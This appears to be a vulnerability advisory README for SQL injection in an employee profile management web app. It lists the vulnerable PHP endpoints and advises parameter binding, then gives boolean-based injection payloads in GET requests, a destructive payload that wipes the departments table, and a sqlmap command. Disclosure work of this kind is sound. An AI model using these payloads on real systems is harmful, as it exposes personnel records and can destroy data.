# employee-management-SQL
Proof-of-Concept and Advisory for Employee Profile Management System SQLi

# Vulnerability Advisory & Exploit

## Affected Version

 Employee Profile Management System 

---

## Vulnerability Type

SQL Injection — Multiple Endpoints (per_id, dept_id, term, etc.)

   edit_personnel.php (parameter per_id)

   view_personnel.php (parameter per_id)

   print_personnel_report.php (parameter term)

   file_table.php (parameter term)

   delete_department.php (parameter dept_id)

   delete_personnel.php (parameter per_id)

   delete_position.php (likely position ID parameter)

   delete_rank.php (likely rank ID parameter)

---

## Advisory (Recommendations)

### Use Parameterized Queries Properly

The application uses **PDO::prepare()** but still concatenates user-controlled parameters into SQL strings. Replace all patterns like:
      
      $sql = "SELECT * FROM personnel WHERE per_id = ".$_GET['per_id'];
      $stmt = $pdo->prepare($sql);


with safe parameter binding:

      $stmt = $pdo->prepare("SELECT * FROM personnel WHERE per_id = :id");
      $stmt->execute([':id' => $_GET['per_id']]);

### Validate All External Input

   Enforce integer-only checks for per_id, dept_id, position_id, rank_id.

   Whitelist allowed term formats (e.g., YYYY-S).

---

## Proof-of-Concept (Exploit)

**Exploit Steps**

### Intercept Request
Use Burp Suite, Fiddler, or browser dev tools to capture requests sent to vulnerable scripts:

   view_personnel.php
   
   edit_personnel.php
   
   file_table.php
   
   print_personnel_report.php
   
   delete_department.php, delete_personnel.php, delete_position.php, delete_rank.php

### Modify Parameters
Inject a SQL payload inside per_id, dept_id, or term.
Example injection payload (simple boolean-based):

         1' OR '1'='1--


### Submit Modified Request
   Forward the injected request to the server.

### Observe Behavior

   Data pages (view/edit/report) will return all rows instead of one.
   
   Delete pages may delete entire tables if unprotected.
   
   SQL errors may reveal DB structure, confirming injection.

## Example PoC Payloads 
### 1. Data Extraction — **view_personnel.php**

**Request**:

      GET /employee_profile/view_personnel.php?per_id=1' OR '1'='1-- 


**Effect**:
Displays information for multiple personnel records.

### 2. Data Extraction — print_personnel_report.php

**Request**:

      GET /employee_profile/print_personnel_report.php?term=2024-1' OR '1'='1-- 


**Effect**:
Returns reports for all terms instead of one.

### 3. Destructive Injection — delete_department.php

For testing on local instance only.

**Request**:

      GET /employee_profile/delete_department.php?dept_id=0 OR 1=1-- 


**Effect**:
Deletes all rows in the departments table.

### 4. Using sqlmap (Optional Automated Exploit)
      sqlmap -u "http://localhost/employee_profile/view_personnel.php?per_id=1" \
        -p per_id --dbs
